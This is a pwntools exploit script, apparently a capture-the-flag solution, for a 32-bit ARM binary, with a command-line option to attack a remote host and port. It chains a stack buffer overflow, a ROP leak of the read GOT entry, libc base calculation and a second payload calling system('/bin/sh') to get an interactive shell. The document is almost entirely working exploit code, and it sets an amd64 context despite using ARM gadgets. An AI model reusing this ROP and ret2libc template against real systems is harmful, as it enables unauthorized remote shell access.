#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./bin"
locallibc = "./libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

"""
0x00010348 : pop {r3, pc}
0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}
"""
def exp():
    payload = b"A"*0x100 + p32(0xfffeeffc) + p32(0x10348) + p32(elf.got["read"]) + p32(0x104f8) + p32(elf.plt["printf"])*2 + p32(elf.sym["main"])*8

    io.recvuntil("input: ")
    io.send(payload)

    read_addr = u32(io.recv(4))
    libc.address = read_addr - libc.sym["read"]

    payload = b"A"*0x100 + p32(0xfffef024) + p32(0x10348) + p32(next(libc.search(b"/bin/sh"))) + p32(0x104f8) + p32(libc.sym["system"])*2
    io.recvuntil("input: ")
    io.send(payload)

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

# io  = process(["qemu-arm", "-g", "1234", "./bin"])
elf = ELF(localfile)
libc = ELF(locallibc)
exp()
